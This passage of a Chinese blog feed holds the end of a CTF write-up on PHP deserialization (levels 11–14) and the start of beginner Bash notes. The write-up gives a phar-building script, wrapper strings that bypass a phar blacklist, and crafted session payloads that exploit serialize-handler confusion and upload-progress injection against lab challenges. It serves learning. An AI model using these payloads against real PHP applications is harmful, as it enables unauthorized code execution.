class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以先试一下看看常见的文件存不存在</p><p><img src="/../image/image-20240425161340203.png" alt="image-20240425161340203"></p><p>目的是echo $flag，然后destruct是要反序列化时才会触发的方法，所以通过md5_file去触发反序列化，由此构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后将生成的文件改成图片类型的后缀上传，然后POST参数附上就可以了</p><p><img src="/../image/image-20240425163542221.png" alt="image-20240425163542221"></p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$boo1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$black_list</span>=[<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;glob&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;ftp&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;https&#x27;</span>,<span class="string">&#x27;ftps&#x27;</span>,<span class="string">&#x27;phar&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$item</span>)&#123;</span><br><span class="line">    <span class="variable">$front</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$item</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$front</span>==<span class="variable">$item</span>)&#123;</span><br><span class="line">        <span class="variable">$boo1</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>) <span class="keyword">and</span> <span class="variable">$boo1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常的phar伪协议是不行的</p><p>当phar被过滤的情况下可以使用下列协议实现绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240425183148519.png" alt="image-20240425183148519"></p><p> 由于黑名单上有zip和php所以使用的payload为:</p><blockquote><p>compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;test.gif&#x2F;test.txt</p></blockquote><p><img src="/../image/image-20240425193124264.png" alt="image-20240425193124264"></p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="comment">//绕过这个需要用到引用</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先去hint.php看看线索</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="comment">//#ini_set设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。 设置选择session序列化选择器</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在index.php中就一个Flag类中存在一个__wakeup魔术方法</p><p>方法内形同虚设，相当于触发了方法直接返回flag</p><p>哪触发wakeup需要反序列化，这里没unserialize函数且没有文件上传</p><p>但hint中发现对session是可控的且在hint.php下session的引擎格式是php_serialize</p><p>默认情况下session处理引擎是php</p><p>此外了解一下ini_set这个函数</p><p>ini_set设置php.ini指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p><p> 也就是说只有在hint.php下时是对session处理的引擎是php_serialize</p><p>其他php文件下还是默认php引擎</p><p>php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string</p><p>当在php_serialize的引擎储存格式下创建session然后处理(验证)session时会把”  |  “当成一个正常的字符。而在php引擎储存格式下处理(验证)同一个session的时会把”  |  “ 当成键与值的分割符然后对分割符后面的值进行反序列化</p><p>所以当我们在自定义session中在序列化语句前加上  |  然后再访问index.php这时，在index.php下服务器验证session的时候因为是php引擎储存格式，所以会对session中  |  后的内容进行反序列化，从而触发了wakeup魔术方法得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="comment">//绕过这个需要用到引用</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = &amp;<span class="variable">$a</span>-&gt;her;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span></span><br><span class="line"><span class="comment">#?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240425203402758.png" alt="image-20240425203402758"></p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>php.ini配置</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.auto_start</span>=<span class="number">0</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.serialize_handler</span> = php_serialize<span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">Off</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span><span class="comment">;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><span class="comment">;&lt;br&gt;session.upload_progress.freq =  &quot;1%&quot;;</span></span><br><span class="line"><span class="attr">session.upload_progress.min_freq</span> = <span class="string">&quot;1&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>主要利用的是session.upload_progress.enabled 当该设置为on 的时候，在向服务器上传任意一个文件的时候php会把该上传文件的详细信息(如上传时间，文件名等)储存在session中，而当我们以POST形式传入名为PHP_SESSION_UPLOAD_PROGRESS的变量时，传入的文件名会被储存到session中(也是filename的值赋值到session中)</p><p>原文链接：<a href="https://blog.csdn.net/qq_73767109/article/details/130856442">https://blog.csdn.net/qq_73767109/article/details/130856442</a></p><p><strong>.写一个文件上传的html</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;upload-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.174.143/ser/level14/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>/&gt;</span></span><br><span class="line">        上传文件…</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改成html尾缀,这里的变量名一定要是PHP_SESSION_UPLOAD_PROGRESS</p><p><strong>打开html任意上传一个文件并抓包</strong></p><p>修改filename为</p><blockquote><p>|O:4:&quot;test&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;flag&quot;;}</p></blockquote><p><img src="/../image/image-20240425211118879.png" alt="image-20240425211118879"></p><p><img src="/../image/image-20240425212308789.png" alt="image-20240425212308789"></p><p>就告一段落了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell笔记</title>
      <link href="/2024/04/12/shell%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/04/12/shell%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章：小试牛刀"><a href="#第一章：小试牛刀" class="headerlink" title="第一章：小试牛刀"></a>第一章：小试牛刀</h1><h2 id="1-1-在终端中显示输出"><a href="#1-1-在终端中显示输出" class="headerlink" title="1.1 在终端中显示输出"></a>1.1 在终端中显示输出</h2><p>​用户是通过终端会话同she1l环境打交道的。如果你使用的是基于图形用户界面的系统，这指的就是终端窗口。如果没有图形用户界面(生产服务器或SSH会话)，那么登录后你看到的就是shell提示符。</p><p>​在终端中显示文本是大多数脚本和实用工具经常需要执行的任务。she1l可以使用多种方法和格式显示文本。</p><h3 id="1-1-1-预备知识"><a href="#1-1-1-预备知识" class="headerlink" title="1.1.1 预备知识"></a>1.1.1 预备知识</h3><p>​命令都是在终端会话中输人并执行的。打开终端时会出现一个提示符。有很多方法可以配置提示符，不过其形式通常如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username@hostname$</span><br><span class="line">[youzipii@localhost ~]$</span><br></pre></td></tr></table></figure><p>或者也可以配置成root@hostname #，或者简单地显示为$或#。</p><p><strong>$表示普通用户，#表示管理员用户root。root是Linux系统中权限最高的用户。</strong></p><p><strong>注意：</strong></p><p>​因为如果shell（root）具备较高的权限，命令中出现的输入错误有可能造成更严重的破坏所以推荐使用普通用户(shel1会在提示符中以s来表明这种身份)登录系统，然后借助sudo这类工具来运行特权命令。使用sudo<command><arguments>执行命令的效果和root一样。</p><p>shell脚本通常以shebang起始:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bahs</span></span><br></pre></td></tr></table></figure><p>​shebang是一个文本行,其中#!位于解释器路径之前。&#x2F;bin&#x2F;bash是Bash的解释器命令路径,bash将以#符号开头的行视为注释。脚本中只有第一行可以使用shebang来定义解释该脚本所使用的解释器。</p><p>脚本的执行方式有两种。</p><p>(1)将脚本名作为命令行参数:</p><p>​bash myScript.sh</p><p>(2)授予脚本执行权限，将其变为可执行文件:</p><p>​chmod 755 myscript.sh</p><p>​.&#x2F;myScript.sh.</p><p>​如果将脚本作为bash的命令行参数来运行，那么就用不着使用shebang了。可以利用shebang来实现脚本的独立运行。可执行脚本使用shebang之后的解释器路径来解释脚本。</p><p>​使用chmoa命令赋予脚本可执行权限:<br>​$ chmod a+x sample.sh</p><p>​该命令使得所有用户可以按照下列方式执行该脚本:</p><p>​$ &#x2F;sample.sh#.&#x2F;表示当前目录<br>或者</p><p>​$ &#x2F;home&#x2F;path&#x2F;sample.sh #使用脚本的完整路径<br>​内核会读取脚本的首行并注意到shebang为#!&#x2F;bin&#x2F;bash。它会识别出&#x2F;bin&#x2F;bash并执行该脚本:<br>​$ &#x2F;bin&#x2F;bash sample.sh<br>​当启动一个交互式she1l时，它会执行一组命令来初始化提示文本、颜色等设置。这组命令来自用户主目录中的脚本文件<del>&#x2F;.bashrc(对于登录shel则是</del>&#x2F;.bash profle)。Bash shell还维护了一个历史记录文件~&#x2F;.bash history，用于保存用户运行过的命令。</p><p>~:表示主目录，通常是&#x2F;home&#x2F;user 其中user是用户名，如果是root则为&#x2F;root</p><p>图形化环境创建的终端不会读取profile或bash_profile（绝大多数情况下），而ssh登陆远程系统时会读取profile。shell使用分号或换行符来分隔单个命令或命令序列。比如：</p><p>$cm1 ; cmd2</p><p>这等同于</p><p>$cmd1</p><p>$cmd2<br>    注释部分以#为起始，一直延续到行尾。注释行通常用于描述代码或是在调试期间禁止执行某行代码·:<br>    #sample.sh-echoes “hello world”<br>    echo “hello world”</p><h3 id="1-1-2-练习"><a href="#1-1-2-练习" class="headerlink" title="1.1.2 练习"></a>1.1.2 练习</h3><p>echo用于终端打印的最基本命令。</p><p>默认情况下，echo在每次调用后会添加一个换行符：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ <span class="built_in">echo</span> <span class="string">&quot;Welcome o bash&quot;</span></span><br><span class="line">Welcome o bash</span><br></pre></td></tr></table></figure><p>​只需要将文本放人双引号中，echo命令就可以将其中的文本在终端中打印出来。类似地不使用双引号也可以得到同样的输出结果.</p><p>​需要注意的是这些方法看起来相似，但各有特定的用途及副作用。双引号允许she1l解释字符串中出现的特殊字符。单引号不会对其做任何解释。</p><p>​如果需要打印像!这样的特殊字符，那就不要将其放入双引号中，而是使用单引号，或是在特殊字符之前加上一个反斜线():但我试了下好像都可以</p><p>​另一个可用于终端打印的命令是printf。该命令使用的参数和C语言中的printf函数一样。<br>例如:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#文件名： printf.sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-5s %-10s %-4s\n&quot;</span> No Name Mark</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-5s %-10s % -4.2f\n&quot;</span> 1 Sarath 80.3456</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240412201042680.png" alt="image-20240412201042680"></p><h3 id="1-1-3-工作原理"><a href="#1-1-3-工作原理" class="headerlink" title="1.1.3 工作原理"></a>1.1.3 工作原理</h3><p>​%s、%c、%d和%f都是格式替换符(fommat substitution character )，它们定义了该如何打印后续参数。-5s指明了一个格式为左对齐且宽度为5的字符串替换(-表示左对齐)。如果不指明-,字符串就采用右对齐形式。宽度指定了保留给某个字符串的字符数量。对Name而言，其保留宽度是10。因此，任何Name字段的内容都会被显示在10字符宽的保留区域内，如果内容不足10个字符，余下的则以空格填充。</p><p>​对于浮点数，可以使用其他参数对小数部分进行舍人(round of)。</p><p>​对于Mark字段，我们将其格式化为$-4.2f，其中.2指定保留两位小数。注意，在每行的格式字符串后都有一个换行符(\n )。</p><h3 id="1-1-4-补充内容"><a href="#1-1-4-补充内容" class="headerlink" title="1.1.4 补充内容"></a>1.1.4 补充内容</h3><p>​使用echo和printf的命令选项时，要确保选项出现在命令中的所有字符串之前，否则Bash会将其视为另外一个字符串。</p><ol><li>在echo中转义换行符</li></ol><p>​默认情况下，echo会在输出文本的尾部追加一个换行符。可以使用选项-n来禁止这种行为。echo同样接受双包含转义序列的双引号字符串作为参数。在使用转义序列时，需要使用echo -e”包含转义序列的字符串”这种形式。例如:</p><p><img src="/../image/image-20240412201415626.png" alt="image-20240412201415626"></p><ol start="2"><li>打印彩色输出</li></ol><p>​脚本可以使用转义序列在终端中生成彩色文本。</p><p>​文本颜色是由对应的色彩码来描述的。其中包括:重置&#x3D;0，黑色&#x3D;30，红色&#x3D;31，绿色&#x3D;32,黄色&#x3D;33，蓝色&#x3D;34，洋红&#x3D;35，青色&#x3D;36，白色&#x3D;37。</p><p><img src="/../image/image-20240412201531119.png" alt="image-20240412201531119"></p><p>​其中\e[1;31m是一个转义字符串，可以将颜色设为红色，\e[0m将颜色重新置回。只需要将31替换成想要的色彩码就可以了。<br>​对于彩色背景，经常使用的颜色码是:重置&#x3D;0，黑色&#x3D;40，红色&#x3D;41，绿色-42，黄色-43蓝色&#x3D;44，洋红&#x3D;45，青色&#x3D;46，白色&#x3D;47。</p><p>​要设置彩色背景的话，可输入如下命令:<br><img src="/../image/image-20240412201653480.png" alt="image-20240412201653480"></p><p>这些例子中包含了一些转义序列。可以使用man console_codes来查看相关文档。</p><h2 id="1-2-使用变量与环境变量"><a href="#1-2-使用变量与环境变量" class="headerlink" title="1.2 使用变量与环境变量"></a>1.2 使用变量与环境变量</h2><p>​所有的编程语言都利用变量来存放数据，以备随后使用或修改。和编译型语言不同，大多数脚本语言不要求在创建变量之前声明其类型。用到什么类型就是什么类型。在变量名前面加上一个美元符号就可以访问到变量的值。shell定义了一些变量，用于保存用到的配置信息，比如可用的打印机、搜索路径等。这些变量叫作<strong>环境变量</strong>。</p><h3 id="1-2-1-预备知识"><a href="#1-2-1-预备知识" class="headerlink" title="1.2.1 预备知识"></a>1.2.1 预备知识</h3><p>​变量名由一系列字母、数字和下划线组成，其中不包含空白字符。常用的惯例是在脚本中使用大写字母命名环境变量，使用驼峰命名法或小写字母命名其他变量。</p><p>​所有的应用程序和脚本都可以访问环境变量。可以使用env或printenv命令查看当前shell中所定义的全部环境变量:</p><p><img src="/../image/image-20240412201913135.png" alt="image-20240412201913135"></p><p>要查看其他进程的环境变量，可以使用如下命令:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /proc/<span class="variable">$PID</span>/environ</span><br></pre></td></tr></table></figure><p>其中，PID是相关进程的进程ID(PID是一个整数)。我们可以使用pgrep或ps -aux | grep 进程名令获得进程ID:</p><p><img src="/../image/image-20240412202225249.png" alt="image-20240412202225249"></p><p><img src="/../image/image-20240412202332320.png" alt="image-20240412202332320"></p><p>​特殊文件&#x2F;proc&#x2F;PID&#x2F;environ是一个包含环境变量以及对应变量值的列表。每一个变量以name&#x3D;value的形式来描述，彼此之间由null字符(\0)分隔。形式上确实不太易读。</p><p>要想生成一份易读的报表，可以将cat命令的输出通过管道传给tr，将其中的\0替换成\n:<br>    $cat &#x2F;proc&#x2F;5588&#x2F;environ | tr ‘\0’ ‘\n’</p><p><img src="/../image/image-20240412202522980.png" alt="image-20240412202522980"></p><h3 id="1-2-2-练习"><a href="#1-2-2-练习" class="headerlink" title="1.2.2 练习"></a>1.2.2 练习</h3><p>​可以使用等号操作符为变量赋值:<br>​varName&#x3D;value<br>​varName是变量名，value是赋给变量的值。如果value不包含任何空白字符(例如空格)，那么就不需要将其放入引号中，否则必须使用单引号或双引号。</p><p><strong>注意</strong>:var &#x3D;value不同于var&#x3D;value。把var&#x3D;value写成var &#x3D;value是一个常见的错误。两边没有空格的等号是赋值操作符,加上空格的等号表示的是等量关系测试。</p><p>在变量名之前加上美元符号($)就可以访问变量的内容。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">var=<span class="string">&quot;value&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240412203000936.png" alt="image-20240412203000936"></p><p>我们可以在printf、echo或其他命令的双引号中引用变量值:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">fruit=apple</span><br><span class="line">count=5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;We have <span class="variable">$count</span> <span class="variable">$&#123;fruit&#125;</span>&#123;s&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240412210750534.png" alt="image-20240412210750534"></p><p>​因为shell使用空白字符来分隔单词，所以我们需要加上一对花括号来告诉shell这里的变量名是fruit，而不是fruit(s)。</p><p>​环境变量是从父进程中继承而来的变量。例如环境变量HTTP_PROXY，它定义了Intermet连接应该使用哪个代理服务器。</p><p>​该环境变量通常被设置成:<br>​HTTP PROXY&#x3D;192.168.1.23:3128<br>​export HTTP_PROXY</p><p>​export命令声明了将由子进程所继承的一个或多个变量。这些变量被导出后，当前shell脚本所执行的任何应用程序都会获得这个变量。she1l创建并用到了很多标准环境变量，我们也可以导出自己的环境变量。<br>​例如，PATH变量列出了一系列可供she1l搜索特定应用程序的目录。一个典型的PATH变量包含如下内容:</p><p><img src="/../image/image-20240412211049043.png" alt="image-20240412211049043"></p><p>​各目录路径之间以:分隔。$PATH通常定义在&#x2F;etc&#x2F;environment、&#x2F;etc&#x2F;profile或~&#x2F;.bashrc中。如果需要在PATH中添加一条新路径，可以使用如下命令:</p><p><img src="/../image/image-20240412211154589.png" alt="image-20240412211154589"></p><p>另外还有一些众所周知的环境变量:HOME、PWD、USER、UID、SHELL等。</p><p><img src="/../image/image-20240412211252443.png" alt="image-20240412211252443"></p><p>​使用单引号时,变量不会被扩展( expand),仍依照原样显示。这意味着s echo$var’会显示svar。<br>​但如果变量$var已经定义过，那么secho”svar”会显示出该变量的值;如果没有定义过，则什么都不显示。</p><h3 id="1-2-3-补充内容"><a href="#1-2-3-补充内容" class="headerlink" title="1.2.3 补充内容"></a>1.2.3 补充内容</h3><p>shell还有很多内建特性。下面就是其中一些。</p><ol><li>获得字符串的长度</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">var=1234567890</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240412225416201.png" alt="image-20240412225416201"></p><ol start="2"><li>识别当前所使用的shell</li></ol><p>echo $0或echo $SHELL</p><p><img src="/../image/image-20240412225512242.png" alt="image-20240412225512242"></p><ol start="3"><li>检查是否为超级用户</li></ol><p>​环境变量UID中保存的是用户D。它可以用于检查当前脚本是以root用户还是以普通用户的身份运行的。例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!bin/bash</span><br><span class="line">if [ $UID -ne 0 ]; then</span><br><span class="line">echo Non root user, please run as root.</span><br><span class="line">else</span><br><span class="line">echo Root user</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240412230241644.png" alt="image-20240412230241644"></p><ol 